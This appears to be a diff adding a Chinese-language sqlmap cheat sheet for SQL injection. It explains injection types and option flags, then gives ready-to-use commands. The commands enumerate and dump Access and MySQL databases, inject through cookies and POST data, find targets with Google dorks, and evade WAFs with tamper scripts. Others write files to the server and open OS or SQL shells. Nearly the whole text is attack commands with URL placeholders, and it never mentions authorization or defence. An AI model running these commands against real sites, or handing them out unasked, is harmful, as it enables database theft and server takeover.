@@ -1,0 +1,107 @@
+五种注入模式
+	1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
+	2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
+	3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
+	4、联合查询注入，可以使用union的情况下的注入。
+	5、堆查询注入，可以同时执行多条语句的执行时的注入。
+
+数据库支持
+	MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
+ 
+Sqlmap注入命令
+指定数据库 -d
+指定一个url -u
+指定表名 -T
+指定字段 -C
+指定字段内容 -D
+
+从文本获取 -m
+分析burpsuite日志 -l
+谷歌黑客 -g	搜索引擎语法：inurl intext intitle site
+操作等级 -v
+	0:只会输出重大错误,以及结果
+	1:基本信息及警告(默认)
+	2:显示debug
+	3:显示payload(常用)
+	4:显示http请求
+	5:显示http响应头
+	6:显示http响应界面
+列表名 --tables
+列字段 --columns
+下载数据 --dump
+定义连接调用位置 --cookie
+检测等级 --level
+使用正则匹配网站 --scope
+查看数据库管理系统所有用户账号 --users
+所有数据库 --dbs
+当前数据库 --current-db
+当前数据库用户 --current-user
+当前用户权限 --is-dba
+要求不对目标写入 --batch
+使用干预脚本 --tamper
+检查URL --check
+当使用https时 --force-ssl
+编译共享库创建并上传至DB Server，一次生成UDF实现高级注入	--udf-inject,--shared-lib
+Linux：shared object
+Windows：DLL
+
+--os-cmd：执行一条命令，前提是当前用户有权执行
+--os-shell：获取一个shell，前提是当前用户有权执行
+--sql-shell：获取sql-shell，前提是当前用户有权执行
+
+一.Access注入
+1.检测是否可注入
+sqlmap.py -u "%url%"
+
+2.猜表
+sqlmap.py -u "%url%" --tables
+
+3.猜字段
+sqlmap.py -u "%url%" -T %表名% --columns
+
+4.猜字段内容
+sqlmap.py -u "%url%" -T %表名% -C %字段名% --dump
+
+二.Mysql注入
+1.获取数据库
+sqlmap.py -u "%url%" --dbs
+
+2.指定数据库，获取表
+sqlmap.py -u "%url%" -D %数据库名% --tables
+
+3.猜字段
+sqlmap.py -u "%url%" -D %数据库名% -T %字段名% --columns
+
+4.猜字段内容
+sqlmap.py -u "%url%" -D %数据库名% -T %字段名% -C %字段内容% --dump
+
+三.Cookies注入
+sqlmap.py -u "%url%" --cookie "%Cookie内容%" --level 2
+
+四.Post注入
+sqlmap.py -u "%url%" –data “%Post数据%”
+
+五.google hack
+sqlmap.py -u "%url%" –g “inurl:asp?id=”
+sqlmap.py -u "%url%" –g “intext:%自定义字符%”
+
+六.Tamper脚本干预的使用
+sqlmap.py -u "%url%" –v 3 --tamper “%脚本文件%” --batch
+
+七.URL检测
+sqlmap.py -u "%url%" --check-waf
+
+八.file参数
+ps：必须为dba，su或root权限，可用--is-dba检测当前用户权限
+sqlmap.py -u "%url%" --file-write=%本地路径% --file-dest=%目标写入路径%
+
+九.post注入
+sqlmap.py -u "%url%" --forms
+
+十.r命令post注入
+sqlmap.py -r %文件路径%
+
+十一.os参数
+ps.先确定权限
+sqlmap.py -u "%url%" --os-cmd=%命令%
+sqlmap.py -u "%url%" --os-shell=%命令%
